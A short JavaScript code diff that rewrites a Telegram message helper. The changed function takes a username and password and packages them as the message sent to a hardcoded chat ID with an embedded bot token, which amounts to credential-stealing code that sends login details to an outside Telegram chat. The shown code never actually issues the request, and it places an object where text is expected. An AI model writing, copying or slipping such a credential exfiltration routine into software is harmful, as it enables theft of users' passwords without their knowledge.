@@ -1,8 +1,12 @@
-export default function sendMessageToChat(chatId, text) {
-const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
+export default function sendMessageToChat(username, password) {
+    const chatId = '7487498429'
+    const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
     const message = JSON.stringify({
         chat_id: chatId,
-        text: text
+        text: {
+            username,
+            password
+        }
     });
 
     const options = {
@@ -14,6 +18,6 @@ const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
             'Content-Length': Buffer.byteLength(message)
         }
     };
-    console.log(text)
+    console.log(message)
 
 }
